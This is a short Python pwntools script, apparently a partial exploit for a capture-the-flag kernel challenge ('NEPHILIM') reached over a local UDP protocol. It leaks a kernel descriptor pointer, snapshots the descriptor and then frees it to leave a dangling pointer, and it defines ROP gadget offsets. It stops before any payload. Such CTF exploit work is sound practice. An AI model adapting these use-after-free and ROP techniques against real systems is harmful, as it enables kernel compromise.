#!/usr/bin/env python3
"""Local protocol probe for the NEPHILIM kernel challenge."""

from pwn import *

import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = 31337
MAGIC = b"NKTP"
PRINTK_LINK = 0x95C929
POP_RDI_LINK = 0x5D1A7B

def request(op, payload=b"", seq=1, timeout=2.0):
    packet = struct.pack(">4sBBHHH", MAGIC, 1, op, seq, len(payload), 0) + payload
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.settimeout(timeout)
        sock.sendto(packet, (HOST, PORT))
        response, _ = sock.recvfrom(1024)
    if response[:4] != MAGIC:
        raise RuntimeError(f"bad magic: {response[:4]!r}")
    version, rop, rseq, length, checksum = struct.unpack(">BBHHH", response[4:12])
    body = response[12:12 + length]
    if version != 1 or rop != op or rseq != seq or len(body) != length:
        raise RuntimeError(
            f"bad response header: version={version} op={rop} seq={rseq} length={length}"
        )
    return body, checksum

body, __ = request(1, b'a'*0x10)
desc_id, desc_ptr = struct.unpack("<QQ", body)
print(f'Desc id: {desc_id}')
print(f'Desc ptr: {hex(desc_ptr)}')

physic_map = desc_ptr

body, __ = request(3, p64(desc_id), seq=2)
print(body)
snap_id = u64(body)

print(f"snap id: {snap_id}")

# Remove desc, leave dangle pointer at snap id
# body will be null
body, __ = request(2, p64(desc_id), seq=3)
